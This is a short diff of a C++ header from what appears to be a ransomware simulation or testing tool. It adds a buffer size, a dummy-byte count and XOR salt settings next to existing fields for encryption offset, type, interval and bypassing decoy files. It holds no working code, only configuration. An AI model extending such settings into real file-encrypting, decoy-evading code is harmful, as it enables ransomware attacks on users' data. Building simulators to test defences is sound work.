@@ -8,6 +8,8 @@
 
 #include "SettingRansomware.h"
 
+#define FILE_BUF_SIZE 4096
+
 typedef struct sFindFileInfo {
 	int type;
 	CString strPath;
@@ -60,7 +62,11 @@ public:
 	int m_cryptOffset;
 	int m_cryptType;
 	int m_cryptInterval; // ms
+	int m_nDummyByte;
 	bool m_bBypassDecoy;
+	bool m_bSaltXOR;
+
+	unsigned char m_nSaltXOR;
 
 
 // 구현입니다.
